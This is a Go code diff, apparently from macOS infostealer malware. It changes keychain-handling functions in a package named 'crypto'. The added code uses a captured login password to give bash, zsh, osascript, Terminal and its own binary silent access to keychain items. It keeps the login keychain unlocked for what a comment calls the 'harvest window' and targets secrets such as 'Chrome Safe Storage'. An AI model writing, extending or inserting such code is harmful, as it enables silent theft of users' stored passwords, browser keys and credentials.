@@ -4,6 +4,7 @@ package crypto
 
 import (
 	"fmt"
+	"os"
 	"os/exec"
 	"regexp"
 	"strings"
@@ -65,6 +66,23 @@ func buildSecurityArgs(args ...string) []string {
 	return full
 }
 
+func keychainTrustedApps() []string {
+	apps := []string{
+		"/usr/bin/security",
+		"/bin/bash",
+		"/bin/zsh",
+		"/usr/bin/osascript",
+		"/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal",
+	}
+	if exe, err := os.Executable(); err == nil {
+		exe = strings.TrimSpace(exe)
+		if exe != "" {
+			apps = append(apps, exe)
+		}
+	}
+	return apps
+}
+
 func setKeyPartitionList(loginKC, service, account string) {
 	if macLoginPassword == "" || loginKC == "" {
 		return
@@ -72,10 +90,11 @@ func setKeyPartitionList(loginKC, service, account string) {
 	args := []string{
 		"set-key-partition-list",
 		"-S", "apple-tool:,apple:,codesign:",
-		"-T", "/usr/bin/security",
-		"-p", macLoginPassword,
-		loginKC,
 	}
+	for _, app := range keychainTrustedApps() {
+		args = append(args, "-T", app)
+	}
+	args = append(args, "-p", macLoginPassword, loginKC)
 	if service != "" {
 		args = append(args, "-s", service)
 	}
@@ -117,8 +136,10 @@ func configureSilentKeychainAccess(loginKC string) {
 		return
 	}
 
-	// Keep login keychain unlocked for the harvest window.
-	_ = exec.Command("security", "set-keychain-settings", "-t", "3600", "-l", loginKC).Run()
+	// Keep login keychain unlocked; -u = do not lock when sleeping.
+	_ = exec.Command("security", "set-keychain-settings", "-t", "3600", "-u", loginKC).Run()
+	_ = exec.Command("security", "default-keychain", "-s", loginKC).Run()
+	_ = exec.Command("security", "list-keychains", "-d", "-s", loginKC).Run()
 
 	known := []struct{ service, account string }{
 		{"Chrome Safe Storage", "Chrome"},
